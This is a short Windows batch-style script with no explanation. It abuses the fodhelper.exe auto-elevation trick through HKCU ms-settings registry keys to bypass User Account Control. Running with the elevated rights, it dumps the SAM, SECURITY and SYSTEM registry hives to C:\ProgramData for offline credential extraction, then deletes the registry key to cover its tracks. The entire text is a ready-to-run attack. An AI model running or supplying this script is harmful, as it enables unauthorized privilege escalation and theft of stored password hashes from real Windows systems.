reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\sam c:\ProgramData\sam.save" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
fodhelper.exe

reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\security c:\ProgramData\security.save" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
fodhelper.exe

reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\system c:\ProgramData\system.save" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
fodhelper.exe

reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1